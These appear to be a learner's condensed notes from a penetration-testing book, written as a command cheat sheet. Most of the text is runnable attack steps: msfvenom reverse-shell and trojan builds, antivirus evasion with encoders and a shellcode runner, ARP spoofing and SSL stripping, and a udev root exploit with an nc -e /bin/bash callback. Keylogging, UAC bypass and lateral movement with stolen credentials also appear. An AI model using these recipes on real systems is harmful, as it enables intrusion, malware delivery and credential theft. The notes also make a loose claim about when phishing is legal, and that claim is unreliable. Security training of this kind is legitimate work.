Ctrl+f `Advanced` for the actual exploits
This is the basics stuff like misconfigured, open ports; misconfigured web servers; and default password
These are the low hanging fruits

Misc. 
HTTP and HTTPS payloads can reconnect ### pg 232, 262 
Metasploit parameters - option, payload, target, exploit

### pg 22, 52
Android VMs setup
### pg 29, 59
Vulnerable windows xp 

Metasploit Suite

msfconsole - interactive CLI
info `module name`
show options
show payload

msfcli - one liners with metasploit
msfcli -h
msfcli `exploit name` 0 - this shows options
msfcli `exploit name` P - this shows payloads
msfcli `exploit name` RHOST=68.92.168.96 - set RHOST to 68.92.168.96
msfcli `exploit name` RHOST=68.92.168.96 E - E stand for exploit

msfvenom - generates payloads
msfvenom -h  - help
-l `payloads` - lists all payloads
-o `show options` - show options for that payload
-p `selected payload`  - select a payload
--help-formats  - show output formats
-f `selected format`  - select format
`OPTION=SET OPTION` - sets option to the set option
>  - redirect the output to a file

msfvenom -l payloads - shows all payloads
msfvenom -p windows/meterpreter/reverse_tcp -o - p is select payload and o is options
msfvenom --help-formats - shows output format
msfvenom -p `payload` 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe > example.exe

Upload this file into a web server and people download and run it. But how to you receive the shell binding or reverse connection
Using the multi/handler module on msfconsole
msfconsole 
use multi/handler
set PAYLOAD `payload name`
set LHOST 192.168.20.6
set LPORT 12345
exploit

This listens on that port for a connection

Exploits have a payload; auxiliaries do not
Auxiliary module - vuln scanners, fuzzers, DoS
scanner - anonymous ftp, ssh, etc

Nmap
-sS SYN
-sT full TCP 
-sU UDP
-sC default script and port scan
-sV port scan and version
--script=`script name`

Nikto - web app vuln scanner
nikto -h `host ip` - h for host

echo 1 > /proc/sys/net/ipv4/ip_forward  - turns on port fowarding

Capturing Traffic 155, 185

### pg 160,190
Arpspoof - ARP cache poisoning
arpspoof -i `interface` -t  `target poisoned cache` `who I want to be`
arpspoof -i eth0 -t 192.1168.20.11 192.168.20.10

One minute is shold be long enough for the cache to refresh
arp -a  - show all cached ips
DNSspoof
dnsspoof -i `interface name` -f `file to spoof`
Redirects all dns to file

Ettercap -> Bettercap
ettercap -Ti eth0 -M arp:remote /192.168.20.1/ /192.168.20.11/
Text interface, arp Mode

### pg 174, 204
SSL stripping: use this after arp spoofing
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
Run this before the sslstrip command?
sslstrip -l 8080  - listen on port 8080

Exploitation 179, 209

### pg 181, 211
Staged payloads - instructions to connect back, less stable, uses more victim memory, smaller
Inline payloads - entire connection in payload, more stable, uses less victim memory,  larger
Staged: windows/shell/reverse_tcp AND windows/meterpreter/bind_tcp
Inline: windows/shell_reverse_tcp AND windows/shell_bind_tcp

Meterpreter: custom payload writer for Metasploit
Meterpreter is an exploit module in Metasploit?
Reflective dll injection - loads shells directly into memory and not to disc to not be detected

### pg 182, 212
WebDAV - Web Distributed Aruthoring and Versioning, extension of HTTP
Cadaver - WebDAV client connection
cadaver http://`ip or doman name`/webdav  - connects to server webdav
default credentials= wampp:xampp 
put `file name` - upload file name

Make a msfvenom reverse shell 
put `reverse shell`
Go to the page and render in the php
Connection completed

Password Attacks 197, 227

### pg 200, 230 
cewl - custom wordlist generator
cewl -w bulbwords.txt -d 1 -m 5 www.bulbsecurity.com  - output bulbwords.txt depth 1 and min word length

crunch - character set generator

### pg 208, 238
Secure Account Manager (SAM), the Windows password management system
LM vs NTLM
LAN Manager (LM) is less secure and default off in Windows 10 
NT LAN Manager (NTLM) is on Windows XP and above and more secure

### pg 210, 240
JohnTheRipper: password cracker
default uses brute force

Advanced Stuff: Cut the crap no more baby stuff

Client-Side Exploitation 215, 245

Metasploit payloads with Meterpreter
windows/shell/reverse_tcp_allports
This is to try all ports to bypass internal filtering to connect back out
HTTP and HTTPS shells
This tries to act like a website request on port 80 or 443 to connect back out

Previously: sending exploit to server
New module: setting up server and wait for browser to access page

server side exploit - sending exploit to a server 
client side exploit - put an exploit on the server so the client's browser is exploited

### pg 223, 253
Metasploit advanced parameters
migration of shell from browser to another process

### pg 225, 255
PDF Exploits (through adobe pdf reader)

exploits on pdf open
exploit/windows/fileformat/adobe_utilprintf  - creates a pdf file
set payload windows/meterpreter/reverse_tcp  - the payload is a reverse tcp
put the pdf in /var/ww to pur on webserver
set up Metasploit listener with multi/handler module

kinda confusing
here's a better explanation https://www.offensive-security.com/metasploit-unleashed/client-side-exploits/

forces adobe to ask to run an exe
exploit/windows/fileformat/adobe_pdf_embedded_exe

### pg 230, 260
Java exploits on JRE
use exploit/multi/browser/java_jre17_jmxbean
set a payload
set payload options
HTTP and HTTPS can reconnect after 

Java Applet Exploit
exploit/multi/browser/java_signed_applet
CERTCN - signed by whatever entity I want
SigningCert - new version overrides CERTCN 

### pg 235, 265
Literal Autopwn on a website
browser_autopwn module
after someone clicks and activates module
sessions -l  - shows all sessions produced

### pg 237, 267
Winamp Exploit
pretend to be a config file replacement
pretend to be skins add-on or something
exploit/windows/fileformat/winamp_maki_bof
set payload windows/meterpreter/reverse_tcp
download and run it, listen on listening machine
again, don't really get it

Social Engineering 243, 273

### pg 244, 274
kinda confusing this isnt that much better though
https://www.social-engineer.org/framework/se-tools/computer-based/social-engineer-toolkit-set/
side note: phishing is not illegal unless you impersonate a company, request credentials, or impersonate someone associated with a company
that means that sending the email is legal but asking identity theft is not
https://statutes.capitol.texas.gov/Docs/BC/htm/BC.325.htm
Ctrl+f for -> TRANSMISSION OF FRAUDULENT ELECTRONIC MAIL PROHIBITED

### pg 244, 274
Social Engineering Toolkit SET
setoolkit
choose which attack type
set payload - how outbound connection is made
set targets - who to send attack to
set exploit - what exploit is exploited
set template - how the email is sent
set listener - after exploit sent? catch outbound connect 
Multi-pronged attack - combine social engineering tactics for better results

Bypassing Antivirus Applications 257, 287

### pg 258, 288
Bypassing Antivirus (the fun stuff)
loading a program into memory and not touching disk  - reflective dll injection by Metasploit
Building a Trojan
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f exe >radmin.exe
reverse_tcp payload
-x  - combine the trojan with the radmin.exe file
-k  - put the trojan in a separate thread
-f  - file is an exe
after that set up a listener with multi/handler

Check the md5sum and sha512sum for tampering/trojan injection
### pg 260, 290
Antivirus Flagging
static analysis - checking hashes and signatures against a database; dictionary checking
dynamic analyssis - flags sus stuff like botnet commands and unnecessary, repetitive stuff

Msfvenom Encoders - encodes the payloads so they don't get flagged
Polymorphic code is available but does not get past most antiviruses
msfvenom -l encoders  - shows all encoders

(null input for payload is redirected to stdin)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -e x86/shikata_ga_nai-i 10 -f exe > radminencoded.exe

Custom Cross Compiling
Format payload into c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9LPORT=2345 -f c -e x86/shikata_ga_nai -i 5
 
cat /dev/urandom  - for random bytes
cat /dev/urandom | tr -dc A-Z-a-z-0-9 | head -c512  - for 512 bytes of alphanumerics

load the shellcode as a string and execute it in c code as shown

int main(void)
{ 
	((void (*)())shellcode)();
}

now throw in some of the random bytes in there as strings
Compile with mingw32 compiler for windows, use gcc if payload is for linux
-586-min-gw32msvc-gcc -o custommeterpreter.exe custommeterpreter.c

### pg 269, 299
Hyperion - encrypts in AES, makes the key small to be bruteforced, then send it out
Wine - allows files made to run on windows run on linux
Hyperion was made to run on windows
cd /usr/share/veil-evasion/tools/hyperion  - file where hyperion is stored
wine hyperion old.exe encrypted.exe  - encrpyts the file

### pg 270, 300
Veil-Evasion - evasion of antivirus software
something something this is a test should only need to wait for 10 min
veil  - open veil (maybe need to cd to Veil-Evasion.py and ./Veil-Evasion.py)
list  - shows all payload encrypters
set options  - setting parameters
generate  - generates the payload
1  - asks if msfvenom payload or custom shell
select payload
set payload options
enter name of output files
1  - Pyinstaller or Py2Exe

Post Exploitation 277, 307

### pg 278, 308
Meterpreter - Post Exploitation

Must be in msfconsole
seesions -l  - shows all open sessions
sessions -i 1  -  interact with the first session

upload `file path` `destination`  - upload local files to remote machine when wget and curl are not installed
upload /usr/share/windows-binaries/nc.exe C:\\  - upload a file to C drive remember to escape the backslash

getuid  - get user id, the name of the account on the machine that is exploited

### pg 280, 310
Meterpreter Scripts - running Metepreter srcipts from a Meterpreter console
Meterpreter scripts saved in /usr/share/metasploit-framwork/scripts/meterpreter

ps - shows all process status, pick one to hijack
run `script name` -h  - h for help
run migrate -p 1144  - migrate the connection to process 1144 which could be anything, try to pick something vulnerable

### pg 281, 311
Metasploit Post-Exploitation Modules
Ctrl+Z  - set the session session in the background
use post/windows/gather/enum_logged_on_users  - shows all used logged on to a machine on a session
set SESSION 1  - the number of the session 
exploit

### pg 283, 213
Railgun - Meterpreter Extension for Windows API interaction
Railgun runs on Ruby
In the session
irb  - Ruby shell
client.railgun.shell32.IsUserAdmin
exit  - drops out of the Ruby interpreter


### pg 283, 313
Getsystem - Windows privesc on Meterpreter
getsystem -h

rev2self  - revert to self, become previous user

Local Escalation Module Windows
exploit/windows/local/ms11_080_afdjoinleaf - exploits afd.sys Windows driver

### pg 285, 315
Windows UAC (user account control security feature)
UAC stops getsystem from running and giver error `Operation failed: Access is denied.`
windows/local/bypassuac
now use getsystem

### pg 287, 317
Linux Privesc
Udev - device manager, manages the device nodes in /dev directory
shell  - spawns a shell on the machine

uname -a  - Linux kernel version
lsb_release -a  - Ubuntu release version
udevadm --version  - checks udev version

### pg 288, 318
A udev exploit from regular to root
searchsploit for udev
use the /usr/share/exploitdb/platforms/linux/local/8572.c one 
Instructions for using 8572.c
 * Usage: 
 * Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, 
 * usually is the udevd PID minus 1) as argv[1]. 
 * The exploit will execute /tmp/run as root so throw whatever payload you 
 * want in there.
cp the 8572.c file to /var/www on kali
wget the file on victim
compile it with gcc on victim
find PID of udev on victim
ps aux | grep udev
put a nc command to connect to kali on victim in /tmp/run
nc `kali ip` `port` -e /bin/bash
set up a nc listener on kali
nc -lvp `port`
execute the exploit with PID

### pg 291, 321
Local Info Gathering - find information from inside the system
Type exit if in shell session to go back to Meterpreter
In Meterpreter search -f *password*
In Meterpreter keyscan_start - start key logger
keyscan_dump - dumps key log into stdout?
keyscan_stop - stop key logger

In shell
net users  - shows all local users
learn the net command
internal network fuzzing?
cat .bash_history  - all previously entered input on shell

### pg 296, 326
Lateral Movement - move from system to another
passwords tend to be shared for accounts under a person

PSExec - a windows CLI tool that lets remote program execution
exploit/windows/smb/psexec
SMBUser and SMBPass are the stolen creds
Because it is end to end encrpyted, it hashes the password first 
SMBPass can be the hash

SSHExec - move through Linux systems using stolen creds
exploit/multi/ssh/sshexec

### pg 300, 330
Token Impersonation with Incognito
load incognito  - run on Meterpreter session	}